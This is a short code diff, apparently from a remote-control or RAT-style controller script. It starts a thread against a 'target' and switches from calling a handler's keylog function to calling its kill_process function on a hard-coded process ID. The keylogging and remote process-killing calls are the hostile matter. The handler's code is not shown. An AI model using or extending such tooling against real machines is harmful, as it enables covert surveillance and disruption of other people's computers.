@@ -77,5 +77,7 @@ t = threading.Thread(target = summon, args = target)
 t.start()
 
 # handler.list_process(target[1])
-handler.keylog(target[1], 5)
+# handler.keylog(target[1], 30)
+# handler.list_application(target[1])
+handler.kill_process(target[1], 16508)
 
